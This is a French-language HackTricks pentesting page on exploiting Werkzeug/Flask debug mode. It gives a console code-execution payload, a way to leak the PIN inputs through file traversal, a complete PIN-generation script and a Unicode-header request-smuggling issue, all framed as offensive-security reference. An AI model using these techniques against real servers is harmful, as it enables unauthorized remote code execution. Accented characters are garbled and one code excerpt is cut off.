# Werkzeug / Flask Debug

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Configuration instantan√©ment disponible pour l'√©valuation des vuln√©rabilit√©s et le pentesting**. R√©alisez un pentest complet depuis n'importe o√π avec plus de 20 outils et fonctionnalit√©s allant de la reconnaissance au reporting. Nous ne rempla√ßons pas les pentesters - nous d√©veloppons des outils personnalis√©s, des modules de d√©tection et d'exploitation pour leur redonner du temps pour approfondir, exploiter des shells et s'amuser.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Console RCE

Si le d√©bogage est actif, vous pourriez essayer d'acc√©der √† `/console` et d'obtenir RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

Il existe √©galement plusieurs exploits sur Internet comme [celui-ci](https://github.com/its-arun/Werkzeug-Debug-RCE) ou un dans metasploit.

## Prot√©g√© par un PIN - Travers√©e de chemin

Dans certaines occasions, le point de terminaison **`/console`** sera prot√©g√© par un PIN. Si vous avez une **vuln√©rabilit√© de travers√©e de fichier**, vous pouvez leak toutes les informations n√©cessaires pour g√©n√©rer ce PIN.

### Exploit de PIN de la console Werkzeug

Forcez une page d'erreur de d√©bogage dans l'application pour voir cela :
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Un message concernant le sc√©nario "console verrouill√©e" est rencontr√© lors de la tentative d'acc√®s √† l'interface de d√©bogage de Werkzeug, indiquant qu'un code PIN est requis pour d√©verrouiller la console. La suggestion est faite d'exploiter le code PIN de la console en analysant l'algorithme de g√©n√©ration de PIN dans le fichier d'initialisation de d√©bogage de Werkzeug (`__init__.py`). Le m√©canisme de g√©n√©ration de PIN peut √™tre √©tudi√© √† partir du [**d√©p√¥t de code source de Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), bien qu'il soit conseill√© de se procurer le code serveur r√©el via une vuln√©rabilit√© de travers√©e de fichiers en raison de potentielles divergences de version.

Pour exploiter le code PIN de la console, deux ensembles de variables, `probably_public_bits` et `private_bits`, sont n√©cessaires :

#### **`probably_public_bits`**

* **`username`** : Fait r√©f√©rence √† l'utilisateur qui a initi√© la session Flask.
* **`modname`** : D√©sign√© g√©n√©ralement comme `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`** : R√©sout g√©n√©ralement √† **Flask**.
* **`getattr(mod, '__file__', None)`** : Repr√©sente le chemin complet vers `app.py` dans le r√©pertoire Flask (par exemple, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Si `app.py` n'est pas applicable, **essayez `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`** : R√©cup√®re l'adresse MAC de la machine actuelle, avec `str(uuid.getnode())` la traduisant en format d√©cimal.
* Pour **d√©terminer l'adresse MAC du serveur**, il faut identifier l'interface r√©seau active utilis√©e par l'application (par exemple, `ens3`). En cas d'incertitude, **fuite `/proc/net/arp`** pour trouver l'ID de l'appareil, puis **extraire l'adresse MAC** de **`/sys/class/net/<device id>/address`**.
*   La conversion d'une adresse MAC hexad√©cimale en d√©cimal peut √™tre effectu√©e comme montr√© ci-dessous :

```python
# Exemple d'adresse MAC : 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`** : Concat√®ne les donn√©es de `/etc/machine-id` ou `/proc/sys/kernel/random/boot_id` avec la premi√®re ligne de `/proc/self/cgroup` apr√®s le dernier slash (`/`).

<details>

<summary>Code pour `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Apr√®s avoir rassembl√© toutes les donn√©es n√©cessaires, le script d'exploitation peut √™tre ex√©cut√© pour g√©n√©rer le PIN de la console Werkzeug :

Apr√®s avoir rassembl√© toutes les donn√©es n√©cessaires, le script d'exploitation peut √™tre ex√©cut√© pour g√©n√©rer le PIN de la console Werkzeug. Le script utilise les `probably_public_bits` et `private_bits` assembl√©s pour cr√©er un hachage, qui subit ensuite un traitement suppl√©mentaire pour produire le PIN final. Ci-dessous se trouve le code Python pour ex√©cuter ce processus :
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Ce script produit le PIN en hachant les bits concat√©n√©s, en ajoutant des sels sp√©cifiques (`cookiesalt` et `pinsalt`), et en formatant la sortie. Il est important de noter que les valeurs r√©elles pour `probably_public_bits` et `private_bits` doivent √™tre obtenues avec pr√©cision √† partir du syst√®me cible pour garantir que le PIN g√©n√©r√© correspond √† celui attendu par la console Werkzeug.

{% hint style="success" %}
Si vous utilisez une **ancienne version** de Werkzeug, essayez de changer l'**algorithme de hachage en md5** au lieu de sha1.
{% endhint %}

## Caract√®res Unicode de Werkzeug

Comme observ√© dans [**ce probl√®me**](https://github.com/pallets/werkzeug/issues/2833), Werkzeug ne ferme pas une requ√™te avec des caract√®res Unicode dans les en-t√™tes. Et comme expliqu√© dans [**ce rapport**](https://mizu.re/post/twisty-python), cela pourrait causer une vuln√©rabilit√© de CL.0 Request Smuggling.

C'est parce qu'il est possible d'envoyer certains caract√®res **Unicode** dans Werkzeug et cela fera **casser** le serveur. Cependant, si la connexion HTTP a √©t√© cr√©√©e avec l'en-t√™te **`Connection: keep-alive`**, le corps de la requ√™te ne sera pas lu et la connexion restera ouverte, donc le **corps** de la requ√™te sera trait√© comme la **prochaine requ√™te HTTP**.

## Exploitation Automatis√©e

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## R√©f√©rences

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Configuration instantan√©ment disponible pour l'√©valuation des vuln√©rabilit√©s et le pentesting**. R√©alisez un pentest complet depuis n'importe o√π avec plus de 20 outils et fonctionnalit√©s allant de la reconnaissance au reporting. Nous ne rempla√ßons pas les pentesters - nous d√©veloppons des outils personnalis√©s, des modules de d√©tection et d'exploitation pour leur redonner du temps pour approfondir, pop des shells et s'amuser.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
